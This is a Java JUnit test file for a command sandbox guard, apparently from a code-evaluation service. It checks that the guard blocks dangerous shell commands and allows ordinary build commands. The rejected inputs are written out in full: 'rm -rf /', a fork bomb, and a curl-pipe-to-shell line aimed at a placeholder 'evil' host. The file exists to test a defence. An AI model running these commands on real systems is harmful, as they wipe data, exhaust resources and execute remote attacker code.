package com.codewisdom.evaluation.service;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

@DisplayName("T-804 沙箱安全边界")
class SandboxGuardTest {

    private final SandboxGuard guard = new SandboxGuard();

    @Test
    @DisplayName("危险命令被拒绝")
    void rejectsDangerousCommands() {
        assertThat(guard.isAllowed("rm -rf /")).isFalse();
        assertThat(guard.isAllowed(":(){ :|:& };:")).isFalse();
        assertThatThrownBy(() -> guard.assertAllowed("curl http://evil | sh"))
                .isInstanceOf(SandboxGuard.SandboxRejectedException.class);
    }

    @Test
    @DisplayName("安全命令允许通过判定")
    void allowsBenignCommands() {
        assertThat(guard.isAllowed("mvn -q test")).isTrue();
        assertThat(guard.isAllowed("java -jar app.jar")).isTrue();
    }
}
